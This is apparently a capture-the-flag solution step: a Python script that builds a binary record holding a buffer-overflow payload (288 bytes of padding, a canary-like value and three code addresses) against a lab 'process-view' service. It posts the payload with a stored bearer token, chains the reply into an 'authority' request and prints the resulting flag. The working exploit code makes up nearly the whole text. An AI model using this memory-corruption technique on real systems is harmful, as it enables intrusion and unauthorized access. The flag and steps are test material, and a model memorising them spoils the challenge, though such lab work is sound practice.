## Step 1: run divergence, then submit the authority (W31.4 acceptance check)

```python
import json, ssl, urllib.request, pathlib, base64, struct
ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
ps = pathlib.Path("receipts/process-session").read_text().strip()
H = {"Authorization": "Bearer " + ps, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}

def crc32c(data):
    crc = 0xffffffff
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ 0x82f63b78 if (crc & 1) else (crc >> 1)
    return crc ^ 0xffffffff

def post(url, obj):
    return json.loads(urllib.request.urlopen(
        urllib.request.Request(url, data=json.dumps(obj).encode(), headers=H, method="POST"),
        context=ctx).read())

BASE = 0x555550000000
ws = (bytearray(b"A" * 288) + struct.pack("<Q", 0x91d4c6aa72be3f05)
      + struct.pack("<Q", BASE + 0x1229) + struct.pack("<Q", BASE + 0x125a)
      + struct.pack("<Q", BASE + 0x2180))
rec = bytearray(b"DVL1") + struct.pack("<H", 1) + struct.pack("<H", 320) + struct.pack("<I", 0) + bytes(ws)
rec[8:12] = struct.pack("<I", crc32c(bytes(rec[12:])))
d3 = post("https://process-view.arwc.test/api/replay-sessions/current/divergence",
          {"case_id": "DV-CRR-4417", "build_id": "DVL-WORKER-R5",
           "record_b64": base64.b64encode(bytes(rec)).decode()})["record"]
d4 = post("https://process-view.arwc.test/api/diagnostic-programs/authority",
          {"execution_id": d3["execution_id"], "correlation": d3["correlation"],
           "history_id": "HIST-APR-CRR-09", "history_digest": d3["history_digest"]})
print("flag:", d4["flag"])
```

Output `flag: FLAG{8f3c02020245b1c4}` with record `HIST-EXPORT-CRR-09`.
